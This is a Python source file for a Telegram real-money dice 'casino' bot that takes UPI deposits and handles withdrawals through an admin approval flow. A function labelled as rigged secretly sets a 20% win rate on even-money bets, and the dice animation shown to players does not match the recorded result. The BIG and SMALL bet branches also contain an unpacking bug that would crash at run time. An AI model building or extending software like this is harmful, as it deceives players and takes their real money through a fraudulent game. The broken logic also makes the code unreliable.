import os
import random
import logging
import sqlite3
from typing import Union
from admin import register_admin_handlers, check_force_join

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Configuration Variables
ADMIN_ID = int(os.environ.get("ADMIN_ID", "123456789"))  # Admin Telegram ID
UPI_ID = os.environ.get("UPI_ID", "kingdipak@fam")       # Aapki UPI ID

# ---------------------------------------------------------
# HELPER FORMATTER (100 Coins = 1 INR)
# ---------------------------------------------------------
def format_bal(coins: float) -> str:
    inr = round(coins / 100.0, 2)
    return f"{int(coins)} Coins ({inr}₹)"

# ---------------------------------------------------------
# 1. IN-BUILT SQLITE DATABASE SETUP
# ---------------------------------------------------------
DB_FILE = "casino_bot.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    # Users Table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            name TEXT,
            balance REAL DEFAULT 0.0,
            wins INTEGER DEFAULT 0,
            losses INTEGER DEFAULT 0
        )
    ''')
    # Requests Table (Deposit / Withdraw)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            details TEXT,
            status TEXT DEFAULT 'pending'
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_user_data(user_id: int, name: str = "User"):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, name, balance, wins, losses FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    if not row:
        # NO SIGNUP BONUS (Default 0.0 Balance)
        cursor.execute("INSERT INTO users (user_id, name, balance, wins, losses) VALUES (?, ?, 0.0, 0, 0)", (user_id, name))
        conn.commit()
        data = {"user_id": user_id, "name": name, "balance": 0.0, "wins": 0, "losses": 0}
    else:
        data = {"user_id": row[0], "name": row[1], "balance": row[2], "wins": row[3], "losses": row[4]}
    conn.close()
    return data

def update_balance(user_id: int, amount: float):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    new_bal = cursor.fetchone()[0]
    conn.close()
    return new_bal

def update_stats(user_id: int, is_win: bool):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    if is_win:
        cursor.execute("UPDATE users SET wins = wins + 1 WHERE user_id = ?", (user_id,))
    else:
        cursor.execute("UPDATE users SET losses = losses + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

# ---------------------------------------------------------
# 2. KEYBOARDS
# ---------------------------------------------------------
def get_main_menu_keyboard():
    keyboard = [
        [
            InlineKeyboardButton(text="🎲 Roll Dice (Big/Small)", callback_data="menu_dice_type"),
            InlineKeyboardButton(text="🎯 Roll Exact Number", callback_data="menu_dice_exact")
        ],
        [
            InlineKeyboardButton(text="💳 Deposit Cash", callback_data="action_deposit"),
            InlineKeyboardButton(text="🏧 Withdraw Cash", callback_data="action_withdraw")
        ],
        [
            InlineKeyboardButton(text="💰 My Balance", callback_data="action_balance"),
            InlineKeyboardButton(text="📊 Profile / Stats", callback_data="action_stats")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard(req_id: int, req_type: str):
    keyboard = [
        [
            InlineKeyboardButton(text="✅ Approve", callback_data=f"adm_app_{req_type}_{req_id}"),
            InlineKeyboardButton(text="❌ Reject", callback_data=f"adm_rej_{req_type}_{req_id}")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------------------------------------------------------
# 3. COMMAND HANDLERS
# ---------------------------------------------------------
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return

    user = update.effective_user
    
    # Har bar fresh/real-time balance fetch hoga DB se
    u_data = get_user_data(user.id, user.first_name)
    
    welcome_text = (
        f"👑 *Welcome to Shadow Casino, {user.first_name}!*\n\n"
        f"💰 *Current Balance:* `{format_bal(u_data['balance'])}`\n\n"
        f"Choose an option below to start playing:"
    )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode="Markdown",
        reply_markup=get_main_menu_keyboard()
    )


# ---------------------------------------------------------
# 4. RIGGED GAME LOGIC (20% WIN / 80% LOSS)
# ---------------------------------------------------------
def calculate_rigged_dice(bet_type: str, selected_val: Union[str, int]) -> int:
    win_roll = random.random() < 0.20  # 20% Chance Win

    if bet_type == "BIG":
        winning_outcomes, losing_outcomes = [4, 5, 6]
    elif bet_type == "SMALL":
        winning_outcomes, losing_outcomes = [1, 2, 3]
    else:
        target = int(selected_val)
        winning_outcomes = [target]
        losing_outcomes = [i for i in range(1, 7) if i != target]

    return random.choice(winning_outcomes) if win_roll else random.choice(losing_outcomes)

# ---------------------------------------------------------
# 5. CALLBACK HANDLERS
# ---------------------------------------------------------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    user_id = user.id
    data = query.data
    
    u_data = get_user_data(user_id, user.first_name)
    bal = u_data['balance']

    if data == "action_balance":
        await query.edit_message_text(
            f"💰 *Wallet Balance:* `{format_bal(bal)}`",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if data == "action_stats":
        text = (
            f"👤 *Player Profile:* {user.first_name}\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"💰 *Balance:* `{format_bal(bal)}`\n"
            f"🟢 *Wins:* `{u_data['wins']}` | 🔴 *Losses:* `{u_data['losses']}`"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
        return

    # Deposit Workflow Step 1
    if data == "action_deposit":
        context.user_data['state'] = 'AWAITING_DEP_AMOUNT'
        text = (
            f"💳 *DEPOSIT CASH*\n\n"
            f"Kripya deposit amount likhein (Coins me):\n"
            f"Example: `100` for 100 Coins (1₹)"
        )
        await query.edit_message_text(text, parse_mode="Markdown")
        return

    # Withdraw Workflow Step 1
    if data == "action_withdraw":
        if bal < 1000:
            await query.edit_message_text("❌ Minimum withdrawal limit is `1000 Coins (10₹)`!", parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
            return
        context.user_data['state'] = 'AWAITING_WD_AMOUNT'
        await query.edit_message_text(
            f"🏧 *WITHDRAW CASH*\n\n"
            f"Kripya Withdrawal Amount coins me likhein:\n"
            f"• Min: `1000 Coins (10₹)`\n"
            f"• Max: `50000 Coins (500₹)`\n"
            f"• Your Balance: `{format_bal(bal)}`", 
            parse_mode="Markdown"
        )
        return

    if data == "menu_dice_type":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔵 SMALL (1, 2, 3)", callback_data="play_bet_SMALL"),
             InlineKeyboardButton(text="🔴 BIG (4, 5, 6)", callback_data="play_bet_BIG")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="back_main")]
        ])
        await query.edit_message_text("🎲 Select Bet Mode:", reply_markup=kb)
        return

    if data == "menu_dice_exact":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="1", callback_data="play_bet_EXACT_1"),
             InlineKeyboardButton(text="2", callback_data="play_bet_EXACT_2"),
             InlineKeyboardButton(text="3", callback_data="play_bet_EXACT_3")],
            [InlineKeyboardButton(text="4", callback_data="play_bet_EXACT_4"),
             InlineKeyboardButton(text="5", callback_data="play_bet_EXACT_5"),
             InlineKeyboardButton(text="6", callback_data="play_bet_EXACT_6")],
            [InlineKeyboardButton(text="🔙 Back", callback_data="back_main")]
        ])
        await query.edit_message_text("🎯 Select Exact Target Number:", reply_markup=kb)
        return

    if data == "back_main":
        context.user_data.clear()
        await query.edit_message_text("Main Menu:", reply_markup=get_main_menu_keyboard())
        return

    # Game Selection -> Asking Bet Amount
    if data.startswith("play_bet_"):
        parts = data.split("_")
        bet_type = parts[2]
        target_val = parts[3] if len(parts) > 3 else None

        context.user_data['game_type'] = bet_type
        context.user_data['game_target'] = target_val
        context.user_data['state'] = 'AWAITING_BET_AMOUNT'

        await query.edit_message_text(
            f"🎲 *Enter Bet Amount (Coins me):*\n\n"
            f"• Minimum Bet: `100 Coins (1₹)`\n"
            f"• Maximum Bet: `1000 Coins (10₹)`\n"
            f"• Your Balance: `{format_bal(bal)}`",
            parse_mode="Markdown"
        )
        return

    # Admin Request Processing
    if data.startswith("adm_"):
        if user_id != ADMIN_ID:
            return
        _, action, rtype, req_id_str = data.split("_")
        req_id = int(req_id_str)

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, amount FROM requests WHERE id = ? AND status = 'pending'", (req_id,))
        req = cursor.fetchone()

        if not req:
            if query.message.photo:
                await query.edit_message_caption("❌ Request already processed.")
            else:
                await query.edit_message_text("❌ Request already processed.")
            conn.close()
            return

        target_u, amt = req[0], req[1]

        if action == "app":
            cursor.execute("UPDATE requests SET status = 'approved' WHERE id = ?", (req_id,))
            conn.commit()
            conn.close()
            
            if rtype == "dep":
                new_b = update_balance(target_u, amt)
                await context.bot.send_message(target_u, f"✅ Deposit of `{format_bal(amt)}` Approved!\nUpdated Balance: `{format_bal(new_b)}`", parse_mode="Markdown")
            else:
                await context.bot.send_message(target_u, f"✅ Withdrawal of `{format_bal(amt)}` Processed!", parse_mode="Markdown")

            if query.message.photo:
                await query.edit_message_caption("✅ Approved!")
            else:
                await query.edit_message_text("✅ Approved!")

        else:
            cursor.execute("UPDATE requests SET status = 'rejected' WHERE id = ?", (req_id,))
            conn.commit()
            conn.close()

            if rtype == "wd":
                update_balance(target_u, amt)  # Refund
                await context.bot.send_message(target_u, f"❌ Withdrawal request of `{format_bal(amt)}` Rejected. Balance Refunded!", parse_mode="Markdown")
            else:
                await context.bot.send_message(target_u, f"❌ Deposit request of `{format_bal(amt)}` Rejected.", parse_mode="Markdown")

            if query.message.photo:
                await query.edit_message_caption("❌ Rejected!")
            else:
                await query.edit_message_text("❌ Rejected!")

# ---------------------------------------------------------
# 6. MESSAGE HANDLERS
# ---------------------------------------------------------
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    state = context.user_data.get('state')

    # 1. Deposit Step 1: Input Amount
    if state == 'AWAITING_DEP_AMOUNT' and update.message.text:
        try:
            amt = float(update.message.text.strip())
            if amt < 100:
                await update.message.reply_text("❌ Minimum deposit amount is `100 Coins (1₹)`!", parse_mode="Markdown")
                return

            context.user_data['dep_amount'] = amt
            context.user_data['state'] = 'AWAITING_DEP_SCREENSHOT'

            text = (
                f"💳 *DEPOSIT DETAILS*\n\n"
                f"• Amount: `{format_bal(amt)}`\n"
                f"• Send Money To UPI: `{UPI_ID}`\n\n"
                f"📸 *Step 2:* Payment karne ke baad screenshot is chat me bhejein."
            )
            await update.message.reply_text(text, parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Valid number daalein (e.g. 100)!")
        return

    # 2. Deposit Step 2: Receive Screenshot
    if state == 'AWAITING_DEP_SCREENSHOT' and update.message.photo:
        amt = context.user_data.get('dep_amount', 100.0)
        photo_id = update.message.photo[-1].file_id

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO requests (user_id, type, amount, details) VALUES (?, 'dep', ?, 'screenshot')", (user.id, amt))
        req_id = cursor.lastrowid
        conn.commit()
        conn.close()

        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=photo_id,
            caption=f"💳 *NEW DEPOSIT REQUEST*\nUser: {user.first_name} (`{user.id}`)\nAmount: `{format_bal(amt)}`",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard(req_id, "dep")
        )
        context.user_data.clear()
        await update.message.reply_text("✅ Screenshot sent to Admin for approval!", reply_markup=get_main_menu_keyboard())
        return

    # 3. Withdraw Step 1: Input Amount
    if state == 'AWAITING_WD_AMOUNT' and update.message.text:
        try:
            amt = float(update.message.text.strip())
            bal = get_user_data(user.id)['balance']

            if amt < 1000 or amt > 50000:
                await update.message.reply_text("❌ Amount `1000 Coins (10₹)` se `50000 Coins (500₹)` ke beech hona chahiye!", parse_mode="Markdown")
                return

            if amt > bal:
                await update.message.reply_text(f"❌ Insufficient Balance! Your Balance: `{format_bal(bal)}`", parse_mode="Markdown")
                return

            context.user_data['wd_amount'] = amt
            context.user_data['state'] = 'AWAITING_WD_UPI'

            await update.message.reply_text("🏧 *Apna UPI ID bhejein:* (e.g. `user@upi`)", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("❌ Valid number daalein!")
        return

    # 4. Withdraw Step 2: Input UPI ID
    if state == 'AWAITING_WD_UPI' and update.message.text:
        upi_details = update.message.text.strip()
        amt = context.user_data.get('wd_amount', 1000.0)
        bal = get_user_data(user.id)['balance']

        if amt > bal:
            await update.message.reply_text("❌ Insufficient balance!")
            context.user_data.clear()
            return

        # Deduct balance temporarily
        update_balance(user.id, -amt)

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO requests (user_id, type, amount, details) VALUES (?, 'wd', ?, ?)", (user.id, amt, upi_details))
        req_id = cursor.lastrowid
        conn.commit()
        conn.close()

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🏧 *NEW WITHDRAWAL REQUEST*\nUser: `{user.id}`\nAmount: `{format_bal(amt)}`\nUPI ID: `{upi_details}`",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard(req_id, "wd")
        )
        context.user_data.clear()
        await update.message.reply_text("✅ Withdrawal Request Sent to Admin!", reply_markup=get_main_menu_keyboard())
        return

    # 5. Dynamic Bet Processing Handler
    if state == 'AWAITING_BET_AMOUNT' and update.message.text:
        try:
            bet_amt = float(update.message.text.strip())
            bal = get_user_data(user.id)['balance']

            if bet_amt < 100 or bet_amt > 1000:
                await update.message.reply_text("❌ Bet Amount `100 Coins (1₹)` se `1000 Coins (10₹)` ke beech me rakhein!", parse_mode="Markdown")
                return

            if bet_amt > bal:
                await update.message.reply_text(f"❌ Insufficient Balance! Available: `{format_bal(bal)}`", parse_mode="Markdown")
                return

            bet_type = context.user_data.get('game_type')
            target_val = context.user_data.get('game_target')

            outcome_dice = calculate_rigged_dice(bet_type, target_val)

            # Animated Dice Roll
            await context.bot.send_dice(chat_id=update.effective_chat.id, emoji="🎲")

            # Check Win Condition
            is_win = False
            if bet_type == "BIG" and outcome_dice in [4, 5, 6]:
                is_win = True
            elif bet_type == "SMALL" and outcome_dice in [1, 2, 3]:
                is_win = True
            elif bet_type == "EXACT" and outcome_dice == int(target_val):
                is_win = True

            if is_win:
                win_amt = bet_amt * 2
                new_bal = update_balance(user.id, win_amt - bet_amt)
                update_stats(user.id, True)
                result_txt = f"🎉 *YOU WON!* (+{format_bal(win_amt)})"
            else:
                new_bal = update_balance(user.id, -bet_amt)
                update_stats(user.id, False)
                result_txt = f"💔 *YOU LOST!* (-{format_bal(bet_amt)}) 🤣"

            context.user_data.clear()

            await update.message.reply_text(
                f"🎲 *Dice Rolled Value:* `{outcome_dice}`\n{result_txt}\n\n💰 Updated Balance: `{format_bal(new_bal)}`",
                parse_mode="Markdown",
                reply_markup=get_main_menu_keyboard()
            )
        except ValueError:
            await update.message.reply_text("❌ Valid number daalein (e.g. 100)!")
        return

# ---------------------------------------------------------
# 7. MAIN ENTRYPOINT
# ---------------------------------------------------------
if __name__ == '__main__':
    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN environment variable not set!")

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.PHOTO | filters.TEXT & ~filters.COMMAND, handle_messages))

    # Register Admin Handlers (Sabse last me)
    register_admin_handlers(app)

    print("⚡ Bot successfully started with all requested fixes...")
    app.run_polling()
